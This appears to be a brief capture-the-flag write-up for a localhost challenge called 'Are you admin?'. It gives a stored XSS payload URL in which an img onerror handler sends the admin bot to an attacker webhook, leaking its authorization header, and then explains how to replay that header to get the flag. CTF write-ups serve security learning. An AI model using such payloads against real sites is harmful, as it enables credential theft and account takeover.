# Are you admin?
This challenge involves leaking admin credential through a stored-xss attack

## Solve
report this payload to get admin authorization header:
```
http://localhost:8000/intro?name=<img src=x onerror="location.href='https://attacker.webhook.site'">&detail=anything
```
This payload use img's tag onerror attribute to redirect the bot to our webhook and 
getting the header

Add that same header to the GET request of /whoami to login as admin and obtain the flag
